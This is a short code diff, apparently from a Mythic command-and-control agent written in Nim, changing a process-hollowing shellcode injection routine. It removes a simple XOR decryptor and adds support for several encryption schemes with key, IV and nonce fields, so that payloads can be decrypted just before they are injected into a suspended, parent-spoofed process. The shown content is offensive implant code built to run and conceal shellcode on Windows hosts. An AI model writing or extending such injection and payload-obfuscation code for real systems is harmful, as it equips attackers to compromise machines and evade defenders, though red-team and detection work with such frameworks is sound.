@@ -1,6 +1,7 @@
 import ../utils/mythic_responses
 import ../utils/debug
 import ../global_data
+import ../utils/crypto
 import std/[json, strutils, strformat, base64]
 
 when defined(windows):
@@ -39,16 +40,10 @@ type
     uuid: string
     shellcode_name: string
     technique: string
+    encryption: string
     key: string
-
-proc xorDecrypt(data: seq[byte], key: string): seq[byte] =
-  ## XOR decrypt shellcode with key
-  if key.len == 0:
-    return data
-  
-  result = newSeq[byte](data.len)
-  for i in 0..<data.len:
-    result[i] = data[i] xor byte(key[i mod key.len])
+    iv: string
+    nonce: string
 
 when defined(windows):
   proc createSuspendedProcess(spawntoPath: string, ppid: uint32): tuple[success: bool, pi: PROCESS_INFORMATION, error: string] =
@@ -347,11 +342,15 @@ proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode
       if shellcode.len == 0:
         return mythicError(taskId, "Shellcode is empty - file download may have failed")
       
-      # Decrypt shellcode if key is provided
       var finalShellcode = shellcode
-      if args.key.len > 0:
-        debug "[DEBUG] Decrypting shellcode with XOR key"
-        finalShellcode = xorDecrypt(shellcode, args.key)
+      # Decrypt shellcode if encryption is specified
+      if args.encryption != "" and args.encryption != "none":
+        debug &"[*] Decrypting shellcode with {args.encryption}..."
+        try:
+          decryptPayload(finalShellcode, args.encryption, args.key, args.iv, args.nonce)
+          debug &"[+] Decryption successful ({finalShellcode.len} bytes)"
+        except Exception as e:
+          return mythicError(taskId, &"Decryption failed: {e.msg}")
       
       debug &"[DEBUG] Injecting shellcode ({finalShellcode.len} bytes) via {args.technique}"
       
